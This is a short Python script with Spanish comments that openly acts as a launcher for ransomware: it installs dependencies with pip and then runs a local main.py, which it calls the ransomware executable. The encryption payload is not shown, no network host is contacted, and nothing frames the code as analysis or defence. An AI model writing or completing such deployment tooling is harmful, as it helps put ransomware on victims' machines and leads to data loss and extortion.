import subprocess
import os
import shutil

def download_file(src, dest):
    """ HCopia un archivo local en lugar de descargarlo de una URL externa """
    if os.path.exists(src):
        shutil.copy(src, dest)
    else:
        raise FileNotFoundError(f"El archivo fuente {src} no existe.")

def install_dependencies():
    """ Instala las dependencias necesarias para el ejecutable principal """
    requirements_path = os.path.abspath("requirements.txt")
    result = subprocess.call(["pip", "install", "-r", requirements_path])
    if result != 0:
        raise RuntimeError("La instalación de dependencias falló.")
    return result

def execute_ransomware():
    """ Ejecuta el ejecutable del ransomware directamente en su ubicación actual """
    executable_path = os.path.abspath("main.py")
    result = subprocess.call(["python", executable_path])
    if result != 0:
        raise RuntimeError("La ejecución del ransomware falló.")
    return result

if __name__ == "__main__":
    try:
        print("Instalando dependencias...")
        install_dependencies()
        
        print("Ejecutando el ransomware...")
        execute_ransomware()
        
    except FileNotFoundError as e:
        print(f"Error: {e}")
    except RuntimeError as e:
        print(f"Error: {e}")
